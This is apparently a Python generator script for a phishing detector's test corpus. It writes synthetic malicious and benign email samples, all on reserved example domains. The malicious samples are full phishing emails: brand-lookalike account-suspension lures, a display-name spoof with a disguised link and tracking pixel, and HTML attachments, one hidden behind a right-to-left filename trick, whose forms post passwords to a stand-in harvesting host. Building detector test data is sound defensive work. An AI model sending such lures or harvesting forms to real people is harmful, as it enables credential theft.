#!/usr/bin/env python3
"""Author the corpus.

Every malicious sample in this repository is written here rather than captured
from a real inbox. That is a deliberate constraint, not laziness:

* A real phishing email contains a real victim's name, address and often an
  entire quoted business thread. Publishing it hands that to anyone who clones.
* Real phishing attachments are frequently live malware. Committing one puts a
  payload in every clone and every mirror, forever, and breaks the acceptable
  use policy of every host involved.
* Synthetic samples are reproducible. A regression test needs the same bytes
  every run, and a captured sample cannot be varied to isolate one rule.

The cost is that these samples exercise the rules rather than the wild. That is
an honest trade: the corpus tests the detector's logic, and the calibration
work in later milestones is what tests its judgement.

Usage::

    python corpus/generator.py

Files are rewritten in place. CI checks that the committed files still match
what this script produces.
"""

from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent

# Every address uses a reserved or documentation domain (RFC 2606, RFC 6761) or
# the .example TLD, so nothing here can ever reach a real mailbox.
SAMPLES: dict[str, dict[str, str]] = {}


def sample(category: str, name: str, body: str) -> None:
    SAMPLES.setdefault(category, {})[name] = body.replace("\n", "\r\n")


# ---------------------------------------------------------------------------
# Malicious: synthetic, authored here, never captured
# ---------------------------------------------------------------------------

sample(
    "malicious",
    "brand-lookalike.eml",
    """\
Return-Path: <bounce@mail-secure.example>
Received: from mail-secure.example (mail-secure.example [198.51.100.23])
\tby mx.example.com with ESMTP id 4Wq2Yz1234
\tfor <victim@example.com>; Tue, 12 Aug 2026 09:14:05 +0000
From: "Microsoft Support" <account@micros0ft-login.example>
To: victim@example.com
Reply-To: "Account Recovery" <recovery@mail-secure.example>
Subject: Action required: your account will be suspended in 24 hours
Date: Tue, 12 Aug 2026 09:14:02 +0000
Message-ID: <5f2a9c04-1b77-4a10-9d3e-77bb0c2e1a55@mail-secure.example>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

Dear customer,

Unusual sign-in activity was detected on your Microsoft account. Your
account will be suspended within 24 hours unless you confirm your details.

Confirm here: http://198.51.100.23/account/verify?id=8831

Microsoft Account Team
""",
)

sample(
    "malicious",
    "display-name-spoof.eml",
    """\
Return-Path: <finance.dept.2026@gmail.com>
Received: from mail-sor-f41.google.example (mail-sor-f41.google.example [203.0.113.41])
\tby mx.example.com with ESMTPS id 3Pk9Rt5678
\tfor <accounts@example.com>; Wed, 13 Aug 2026 14:02:11 +0000
From: "PayPal Service <service@paypal.com>" <finance.dept.2026@gmail.com>
From: "PayPal Service" <finance.dept.2026@gmail.com>
To: accounts@example.com
Subject: =?utf-8?B?SW52b2ljZSBJTlYtOTkyMSBpcyBwYXN0IGR1ZQ==?=
Date: Wed, 13 Aug 2026 14:02:09 +0000
MIME-Version: 1.0
Content-Type: text/html; charset="utf-8"

<html><body>
<p>Your invoice INV-9921 is past due.</p>
<p><a href="http://billing-paypa1.example/pay">https://www.paypal.com/invoice</a></p>
<img src="http://tracker.example/o.gif?id=9921" width="1" height="1">
</body></html>
""",
)

sample(
    "malicious",
    "homograph-attachment.eml",
    """\
Return-Path: <noreply@xn--pple-43d.example>
Received: from relay.xn--pple-43d.example (relay.xn--pple-43d.example [192.0.2.77])
\tby mx.example.com with ESMTP id 7Zx1Qa9012
\tfor <victim@example.com>; Thu, 14 Aug 2026 03:41:52 +0000
From: "Apple ID" <noreply@xn--pple-43d.example>
To: victim@example.com
Subject: Your receipt from Apple
Date: Sat, 01 Mar 2025 11:00:00 +0000
Message-ID: <receipt-4471@relay.example>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b0undary42"

--b0undary42
Content-Type: text/plain; charset="utf-8"

A payment of $499.00 was charged to your Apple ID. If you did not
authorise this, open the attached form to cancel.

--b0undary42
Content-Type: text/html; name="invoice\u202egnp.html"
Content-Disposition: attachment; filename="invoice\u202egnp.html"
Content-Transfer-Encoding: 7bit

<html><body><form action="http://collect.example/harvest" method="post">
<input name="appleid"><input name="password" type="password">
<input type="submit" value="Cancel payment">
</form></body></html>

--b0undary42--
""",
)


sample(
    "malicious",
    "instructor-demo.eml",
    """\
Return-Path: <bounce@mail-secure.example>
Received: from mail-secure.example (mail-secure.example [198.51.100.23])
\tby mx.example.com with ESMTP id 4Wq2Yz1234
\tfor <victim@example.com>; Tue, 12 Aug 2026 09:14:05 +0000
Authentication-Results: mx.example.com;
\tspf=pass smtp.mailfrom=bounce@mail-secure.example;
\tdkim=fail header.d=micros0ft-login.example;
\tdmarc=fail policy.p=none header.from=micros0ft-login.example
Received-SPF: pass (mail-secure.example: domain of bounce@mail-secure.example designates 198.51.100.23 as permitted sender)
From: "Microsoft Support" <account@micros0ft-login.example>
To: victim@example.com
Reply-To: "Account Recovery" <recovery@mail-secure.example>
Subject: Action required: your account will be suspended in 24 hours
Date: Tue, 12 Aug 2026 09:14:02 +0000
Message-ID: <5f2a9c04-1b77-4a10-9d3e-77bb0c2e1a55@mail-secure.example>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="demo42"

--demo42
Content-Type: text/html; charset="utf-8"

<html><body>
<p>Unusual sign-in activity was detected on your Microsoft account.</p>
<p><a href="http://198.51.100.23/account/verify?id=8831">https://account.microsoft.com/secure</a></p>
<p><a href="http://go.mail-secure.example/redirect?u=http://collect.example/login">Review activity</a></p>
</body></html>

--demo42
Content-Type: text/html; name="invoice.html"
Content-Disposition: attachment; filename="invoice.html"
Content-Transfer-Encoding: 7bit

<html><body><form action="http://collect.example/harvest" method="post">
<input name="password" type="password">
<input type="submit" value="Verify account">
</form></body></html>

--demo42--
""",
)


# ---------------------------------------------------------------------------
# Benign: the false-positive suite.
#
# These matter more than the malicious ones. Any heuristic can find phishing if
# it flags everything; staying quiet on ordinary mail is the hard part, and the
# corpus regression test enforces it.
# ---------------------------------------------------------------------------

sample(
    "benign",
    "newsletter.eml",
    """\
Return-Path: <bounces+21947-news@bounce.mailprovider.example>
Received: from o3.mailprovider.example (o3.mailprovider.example [203.0.113.9])
\tby mx.example.com with ESMTPS id 1Ab2Cd3456
\tfor <reader@example.com>; Mon, 11 Aug 2026 06:30:12 +0000
From: "The Weekly Dispatch" <news@newsletter.example>
To: reader@example.com
Reply-To: <no-reply@mailprovider.example>
Subject: This week: five things worth reading
Date: Mon, 11 Aug 2026 06:30:10 +0000
Message-ID: <20260811063010.21947@o3.mailprovider.example>
Authentication-Results: mx.example.com;
\tspf=pass smtp.mailfrom=bounces+21947-news@bounce.mailprovider.example;
\tdkim=pass header.d=newsletter.example;
\tdmarc=pass header.from=newsletter.example
List-Id: The Weekly Dispatch <dispatch.newsletter.example>
List-Unsubscribe: <https://newsletter.example/unsubscribe?id=21947>
Precedence: bulk
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"

Hello,

Here are the five stories we thought were worth your time this week.

1. A short history of the public suffix list
2. Why your MTA disagrees with your mail client

Read online: https://newsletter.example/issues/214
Unsubscribe: https://newsletter.example/unsubscribe?id=21947
""",
)

sample(
    "benign",
    "receipt.eml",
    """\
Return-Path: <orders@shop.example>
Received: from smtp.shop.example (smtp.shop.example [203.0.113.55])
\tby mx.example.com with ESMTPS id 9Ef8Gh7654
\tfor <buyer@example.com>; Fri, 08 Aug 2026 17:22:41 +0000
From: "Shop Example Orders" <orders@shop.example>
To: buyer@example.com
Subject: Your order 5512-A has shipped
Date: Fri, 08 Aug 2026 17:22:38 +0000
Message-ID: <order-5512-A@shop.example>
Authentication-Results: mx.example.com;
\tspf=pass smtp.mailfrom=orders@shop.example;
\tdkim=pass header.d=shop.example;
\tdmarc=pass header.from=shop.example
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"

Thanks for your order.

Order 5512-A shipped today and should arrive within three working days.
Track it at https://shop.example/orders/5512-A

Shop Example
""",
)

sample(
    "benign",
    "internal-memo.eml",
    """\
Return-Path: <alice@corp.example>
Received: from mail.corp.example (mail.corp.example [192.0.2.10])
\tby mail.corp.example with ESMTP id 2Jk4Lm8890
\tfor <bob@corp.example>; Thu, 07 Aug 2026 08:05:00 +0000
From: "Alice Nakamura" <alice@corp.example>
To: "Bob Ellis" <bob@corp.example>
Subject: Notes from yesterday's planning session
Date: Thu, 07 Aug 2026 08:04:58 +0000
Message-ID: <CAF9x2mQ7pL@mail.corp.example>
Authentication-Results: mail.corp.example;
\tspf=pass smtp.mailfrom=alice@corp.example;
\tdkim=pass header.d=corp.example;
\tdmarc=pass header.from=corp.example
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"

Bob,

Notes from yesterday are on the shared drive under Planning/2026-08.
Nothing urgent, but take a look before Friday.

Alice
""",
)


def write_all(root: Path = HERE) -> list[Path]:
    written: list[Path] = []
    for category, files in SAMPLES.items():
        directory = root / category
        directory.mkdir(parents=True, exist_ok=True)
        for name, content in files.items():
            path = directory / name
            path.write_bytes(content.encode("utf-8"))
            written.append(path)
    return written


def check_all(root: Path = HERE) -> list[Path]:
    """Return committed files that no longer match the generator."""
    stale: list[Path] = []
    for category, files in SAMPLES.items():
        for name, content in files.items():
            path = root / category / name
            if not path.is_file() or path.read_bytes() != content.encode("utf-8"):
                stale.append(path)
    return stale


def main(argv: list[str]) -> int:
    if "--check" in argv:
        stale = check_all()
        if stale:
            print("corpus files differ from generator.py:", file=sys.stderr)
            for path in stale:
                print(f"  {path}", file=sys.stderr)
            print("\nRun: python corpus/generator.py", file=sys.stderr)
            return 1
        print(f"corpus is in sync ({sum(len(v) for v in SAMPLES.values())} files)")
        return 0

    written = write_all()
    for path in written:
        print(f"wrote {path.relative_to(HERE.parent)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
